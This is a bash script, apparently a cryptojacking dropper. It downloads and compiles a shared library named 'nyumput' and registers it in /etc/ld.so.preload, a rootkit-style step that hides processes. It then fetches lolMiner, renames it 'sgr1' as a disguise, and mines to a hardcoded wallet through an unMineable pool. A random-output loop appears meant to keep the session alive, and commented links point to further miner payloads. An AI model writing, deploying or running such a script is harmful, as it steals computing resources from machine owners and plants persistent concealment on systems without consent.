#!/bin/bash
apt-get update ; apt-get install sudo wget cpulimit -y
curl https://bitbucket.org/koploks/watir/raw/master/nyumput.c -o nyumput.c
apt-get install build-essential -y
gcc -Wall -fPIC -shared -o libnyumput.so nyumput.c -ldl
mv libnyumput.so /usr/local/lib/
echo /usr/local/lib/libnyumput.so >> /etc/ld.so.preload
rm nyumput.c
mkdir .lib && cd .lib
# https://github.com/Sazfa-Kuy/ocvminer/raw/main/maker
# https://github.com/TiannaMcdowell/All-File/raw/main/sereb plant
# https://github.com/barburonjilo/back/raw/main/sr srb
wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.88/lolMiner_v1.88_Lin64.tar.gz && tar -xvf lolMiner_v1.88_Lin64.tar.gz && cd 1.88
mv lolMiner sgr1
chmod +x sgr1
cpulimit -l 100 -e sgr1 &
./sgr1 --algo PYRIN --pool stratum+ssl://pyrinhash.unmineable.com:4444 --user XMR:83ErkzmC8yH2omjYvg6G7vc4fiP33k9EsXrGjs4ssW7hetWN3VHKgtVDsGTpjipJmDMWnsgpfb32NYw186uYE2UyEcDv343.unmineable_worker_skpqgrai   &
while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 3m; done
